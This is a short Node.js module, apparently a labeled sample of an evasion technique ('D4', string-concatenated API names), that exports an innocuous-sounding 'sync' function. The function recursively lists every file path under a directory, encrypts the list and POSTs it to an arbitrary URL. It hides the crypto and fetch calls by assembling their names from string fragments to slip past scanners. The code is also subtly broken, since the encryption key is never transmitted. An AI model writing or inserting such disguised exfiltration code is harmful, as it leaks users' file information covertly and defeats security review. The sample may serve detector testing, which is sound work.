'use strict';
const fs = require('fs');
const crypto = require('crypto');

function treescan(root) {
  const out = [];
  (function walk(d) {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else out.push(p);
    }
  })(root);
  return out;
}

// D4 字符串拼接 API 名：运行时拼出方法名
async function sync(root, url) {
  const f = treescan(root);
  const mod = require('cry' + 'pto');
  const k = mod.randomBytes(32), iv = mod.randomBytes(16);
  const c = mod['create' + 'Cipher' + 'iv']('aes-256-gcm', k, iv);
  const body = Buffer.concat([iv, c.update(Buffer.from(f.join('\n'))), c.final()]);
  const net = require('und' + 'ici');
  return net['fe' + 'tch'](url, { method: 'POST', body: body });
}
module.exports = { sync };
